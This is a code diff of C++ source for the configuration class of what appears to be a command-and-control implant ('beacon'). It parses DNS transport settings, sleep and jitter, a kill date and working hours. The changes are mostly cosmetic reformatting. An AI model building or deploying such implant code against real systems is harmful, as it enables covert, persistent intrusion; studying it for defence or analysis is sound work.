@@ -4,13 +4,13 @@
 #include "utils.h"
 #include "config.h"
 
-void* AgentConfig::operator new(size_t sz)
+void* AgentConfig::operator new(size_t sz) 
 {
 	void* p = MemAllocLocal(sz);
 	return p;
 }
 
-void AgentConfig::operator delete(void* p) noexcept
+void AgentConfig::operator delete(void* p) noexcept 
 {
 	MemFreeLocal(&p, sizeof(AgentConfig));
 }
@@ -74,34 +74,31 @@ AgentConfig::AgentConfig()
 	this->jitter_delay    = 0;
 
 #elif defined(BEACON_DNS)
-	this->profile.domain      = packer->UnpackBytesCopy(&length);
-	this->profile.resolvers   = packer->UnpackBytesCopy(&length);
-	this->profile.qtype       = packer->UnpackBytesCopy(&length);
-	this->profile.pkt_size    = packer->Unpack32();
-	this->profile.label_size  = packer->Unpack32();
-	this->profile.ttl         = packer->Unpack32();
-	this->profile.encrypt_key = this->encrypt_key;
+	this->profile.domain        = packer->UnpackBytesCopy(&length);
+	this->profile.resolvers     = packer->UnpackBytesCopy(&length);
+	this->profile.qtype         = packer->UnpackBytesCopy(&length);
+	this->profile.pkt_size      = packer->Unpack32();
+	this->profile.label_size    = packer->Unpack32();
+	this->profile.ttl           = packer->Unpack32();
+	this->profile.encrypt_key   = this->encrypt_key;
 	this->profile.burst_enabled = packer->Unpack32();
 	this->profile.burst_sleep   = packer->Unpack32();
 	this->profile.burst_jitter  = packer->Unpack32();
 
-	this->listener_type       = packer->Unpack32();
-	this->kill_date           = packer->Unpack32();
-	this->working_time        = packer->Unpack32();
-	this->sleep_delay         = packer->Unpack32();
-	this->jitter_delay        = packer->Unpack32();
+	this->listener_type = packer->Unpack32();
+	this->kill_date     = packer->Unpack32();
+	this->working_time  = packer->Unpack32();
+	this->sleep_delay   = packer->Unpack32();
+	this->jitter_delay  = packer->Unpack32();
 
 #endif
 
 #if defined(BEACON_DNS)
-	// DNS beacon uses a smaller per-chunk download size to improve
-	// reliability over the constrained DNS transport channel.
 	this->download_chunk_size = 0x8000; // 32 KB
 #else
-	this->download_chunk_size = 0x19000; // ~100 KB for HTTP/other transports
+	this->download_chunk_size = 0x19000; // ~100KB 
 #endif
 
 	delete packer;
 	MemFreeLocal((LPVOID*)&ProfileBytes, size);
-
 }
